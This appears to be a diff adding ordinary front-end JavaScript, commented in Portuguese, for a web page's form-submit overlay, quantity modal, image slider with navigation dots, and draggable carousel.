+document.getElementById('meu-formulario').addEventListener('submit', function (e) {
+    // Previne o envio imediato do formulário
+    e.preventDefault();
+
+    // Mostra o overlay
+    const overlay = document.getElementById('overlay2');
+    overlay.style.display = 'flex';
+
+    // Aguarda 3 segundos antes de prosseguir
+    setTimeout(() => {
+        // Remove o overlay
+        overlay.style.display = 'none';
+
+        // Prossegue com o envio do formulário
+        this.submit();
+    }, 3000);
+});
+
+
+
+
+
+
+      // Funções para o modal
+      function openModal() {
+        document.getElementById("quantity-modal").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      }
+    
+      function closeModal() {
+        document.getElementById("quantity-modal").style.display = "none";
+        document.getElementById("overlay").style.display = "none";
+      }
+    
+      function selectQuantity(quantity) {
+        document.getElementById("selected-quantity").textContent = quantity;
+        document.getElementById("quantidade").value = quantity;
+        closeModal();
+      }
+    
+      window.onclick = function (event) {
+        const modal = document.getElementById("quantity-modal");
+        const overlay = document.getElementById("overlay");
+        if (event.target == overlay) {
+          closeModal();
+        }
+      };
+    
+      // Função de Slider (com bolinhas de navegação)
+      const slider = document.querySelector(".slider");
+      const dots = document.querySelectorAll(".dot");
+      let currentIndex = 0;
+    
+      function showSlide(index) {
+        const slideWidth = slider.offsetWidth;
+        slider.style.transition = "transform 0.4s ease-in-out";
+        slider.style.transform = `translateX(-${index * slideWidth}px)`;
+        updateDots(index);
+        currentIndex = index;
+      }
+    
+      function updateDots(index) {
+        dots.forEach((dot, i) => {
+          dot.classList.toggle("active", i === index);
+        });
+      }
+    
+      dots.forEach((dot) => {
+        dot.addEventListener("click", () => {
+          const index = parseInt(dot.dataset.index);
+          showSlide(index);
+        });
+      });
+    
+      window.addEventListener("resize", () => {
+        showSlide(currentIndex);
+      });
+    
+      // Função para o Carrossel
+      const carousel = document.querySelector(".carousel");
+      let isDragging = false;
+      let startX, currentTranslate = 0, prevTranslate = 0;
+    
+      function startCarouselDrag(e) {
+        isDragging = true;
+        startX = getPositionX(e);
+        carousel.style.transition = "none"; // Remove a transição durante o arraste
+        carousel.style.cursor = "grabbing";
+      }
+    
+      function carouselDrag(e) {
+        if (!isDragging) return;
+        const currentPosition = getPositionX(e);
+        const delta = currentPosition - startX;
+        carousel.style.transform = `translateX(${prevTranslate + delta}px)`;
+      }
+    
+      function stopCarouselDrag(e) {
+        if (!isDragging) return;
+        isDragging = false;
+        const movedBy = getPositionX(e) - startX;
+    
+        const slideWidth = 180; // Largura da imagem (200px) + gap (10px)
+        if (movedBy < -50) {
+          currentTranslate -= slideWidth;
+        } else if (movedBy > 50) {
+          currentTranslate += slideWidth;
+        }
+    
+        currentTranslate = Math.min(0, currentTranslate);
+        const maxTranslate = -(carousel.scrollWidth - carousel.offsetWidth);
+        currentTranslate = Math.max(maxTranslate, currentTranslate);
+    
+        carousel.style.transition = "transform 0.3s ease-out";
+        carousel.style.transform = `translateX(${currentTranslate}px)`;
+        prevTranslate = currentTranslate;
+        carousel.style.cursor = "grab";
+      }
+    
+      function getPositionX(e) {
+        return e.type.includes("mouse") ? e.pageX : e.touches[0].clientX;
+      }
+    
+      carousel.addEventListener("mousedown", startCarouselDrag);
+      carousel.addEventListener("mousemove", carouselDrag);
+      carousel.addEventListener("mouseup", stopCarouselDrag);
+      carousel.addEventListener("mouseleave", stopCarouselDrag);
+      carousel.addEventListener("touchstart", startCarouselDrag);
+      carousel.addEventListener("touchmove", carouselDrag);
+      carousel.addEventListener("touchend", stopCarouselDrag);
+
+
+
+    </script>
+
+<script>
+  // Código existente permanece como está.
+
+  // Novo comportamento para o slider com nomes de variáveis exclusivos
+  const sliderContainer = document.querySelector('.slider-wrapper');
+  const sliderContent = document.querySelector('.slider');
+  const sliderItems = document.querySelectorAll('.slider-image');
+  const navigationDots = document.querySelectorAll('.dot');
+
+  let isSliderDragging = false;
+  let sliderStartX, sliderCurrentTranslate = 0, sliderPrevTranslate = 0;
+  let sliderAnimationID, sliderCurrentIndex = 0;
+
+  // Função para definir a posição do slider
+  function setSliderContentPosition() {
+    sliderContent.style.transform = `translateX(${sliderCurrentTranslate}px)`;
+  }
+
+  // Atualizar os dots do slider
+  function updateSliderActiveDot(index) {
+    navigationDots.forEach((dot, i) => {
+      dot.classList.toggle("active", i === index);
+    });
+  }
+
+  // Início do arraste
+  sliderContainer.addEventListener('mousedown', (e) => {
+    isSliderDragging = true;
+    sliderStartX = e.pageX;
+    sliderAnimationID = requestAnimationFrame(sliderAnimation);
+    sliderContent.style.cursor = 'grabbing';
+  });
+
+  sliderContainer.addEventListener('touchstart', (e) => {
+    isSliderDragging = true;
+    sliderStartX = e.touches[0].clientX;
+    sliderAnimationID = requestAnimationFrame(sliderAnimation);
+  });
+
+  // Movimento durante o arraste
+  sliderContainer.addEventListener('mousemove', (e) => {
+    if (isSliderDragging) {
+      const currentPosition = e.pageX;
+      sliderCurrentTranslate = sliderPrevTranslate + (currentPosition - sliderStartX);
+    }
+  });
+
+  sliderContainer.addEventListener('touchmove', (e) => {
+    if (isSliderDragging) {
+      const currentPosition = e.touches[0].clientX;
+      sliderCurrentTranslate = sliderPrevTranslate + (currentPosition - sliderStartX);
+    }
+  });
+
+  // Finalizar o arraste
+  sliderContainer.addEventListener('mouseup', () => {
+    isSliderDragging = false;
+    cancelAnimationFrame(sliderAnimationID);
+
+    const movedBy = sliderCurrentTranslate - sliderPrevTranslate;
+    if (movedBy < -50 && sliderCurrentIndex < sliderItems.length - 1) {
+      sliderCurrentIndex++;
+    } else if (movedBy > 50 && sliderCurrentIndex > 0) {
+      sliderCurrentIndex--;
+    }
+
+    sliderCurrentTranslate = -sliderCurrentIndex * sliderItems[0].clientWidth;
+    sliderPrevTranslate = sliderCurrentTranslate;
+    setSliderContentPosition();
+    updateSliderActiveDot(sliderCurrentIndex);
+    sliderContent.style.cursor = 'grab';
+  });
+
+  sliderContainer.addEventListener('touchend', () => {
+    isSliderDragging = false;
+    cancelAnimationFrame(sliderAnimationID);
+
+    const movedBy = sliderCurrentTranslate - sliderPrevTranslate;
+    if (movedBy < -50 && sliderCurrentIndex < sliderItems.length - 1) {
+      sliderCurrentIndex++;
+    } else if (movedBy > 50 && sliderCurrentIndex > 0) {
+      sliderCurrentIndex--;
+    }
+
+    sliderCurrentTranslate = -sliderCurrentIndex * sliderItems[0].clientWidth;
+    sliderPrevTranslate = sliderCurrentTranslate;
+    setSliderContentPosition();
+    updateSliderActiveDot(sliderCurrentIndex);
+  });
+
+  // Prevenir comportamento padrão ao arrastar
+  sliderContainer.addEventListener('mouseleave', () => {
+    isSliderDragging = false;
+    cancelAnimationFrame(sliderAnimationID);
+    sliderContent.style.cursor = 'grab';
+  });
+
+  // Sincronizar posição ao clicar nos dots
+  navigationDots.forEach((dot, index) => {
+    dot.addEventListener("click", () => {
+      sliderCurrentIndex = index;
+      sliderCurrentTranslate = -sliderCurrentIndex * sliderItems[0].clientWidth;
+      sliderPrevTranslate = sliderCurrentTranslate;
+      setSliderContentPosition();
+      updateSliderActiveDot(index);
+    });
+  });
+
+  // Função de animação contínua durante o arraste
+  function sliderAnimation() {
+    setSliderContentPosition();
+    if (isSliderDragging) {
+      requestAnimationFrame(sliderAnimation);
+    }
+  }
+</script>
+
+    
+
+</body>
+</html>
